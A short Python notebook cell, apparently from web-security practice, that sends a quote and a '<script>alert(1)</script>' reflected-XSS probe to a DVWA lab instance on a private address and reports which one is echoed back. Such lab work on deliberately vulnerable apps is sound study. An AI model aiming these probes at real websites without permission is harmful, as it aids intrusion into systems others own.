# %%
import requests
url="http://192.168.122.170/dvwa/vulnerabilities/xss_r/"
payload=["'","<script>alert(1)</script>"]

for p in payload:
    r=requests.get(url,params={"q":p})
    if p in r.text:
        print(f"found{p}")
    else:
        print("not")
# Out:
# found'
# not
